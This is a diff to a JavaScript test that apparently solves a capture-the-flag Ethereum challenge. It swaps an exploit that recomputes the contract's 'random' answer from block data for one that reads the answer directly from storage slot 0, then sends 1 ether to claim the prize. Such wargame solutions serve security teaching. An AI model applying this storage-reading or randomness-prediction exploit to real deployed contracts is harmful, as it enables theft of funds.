@@ -26,28 +26,8 @@ describe('GuessTheRandomNumberChallenge', () => {
   });
 
   it('exploit', async () => {
-    // Get the current block number and retrieve that block.
-    const blockNumber = await provider.getBlockNumber();
-    const block = await provider.getBlock(blockNumber);
-    console.log('Deployment Block Number:', blockNumber);
-    console.log('Deployment Block Timestamp:', block.timestamp);
-
-    // Retrieve the previous block's hash (block.number - 1).
-    const previousBlock = await provider.getBlock(blockNumber - 1);
-    const previousBlockHash = previousBlock.hash;
-    console.log('Previous Block Hash:', previousBlockHash);
-
-    // Recreate the contract's "random" answer:
-    // answer = uint8(keccak256(previousBlockHash, block.timestamp))
-    const hash = utils.solidityKeccak256(
-      ['bytes32', 'uint256'],
-      [previousBlockHash, block.timestamp]
-    );
-
-    // Take the last byte (8 bits) of the hash
-    
-    const lastByteHex = ethers.utils.hexDataSlice(hash, 31, 32);
-    const guessInt = parseInt(lastByteHex, 16);
+   
+    const guessInt = await target.provider.getStorageAt(target.address, 0);
 
     // Call the guess function from the attacker account and send 1 ether.
     const tx = await target.guess(guessInt, { value: utils.parseEther('1') });
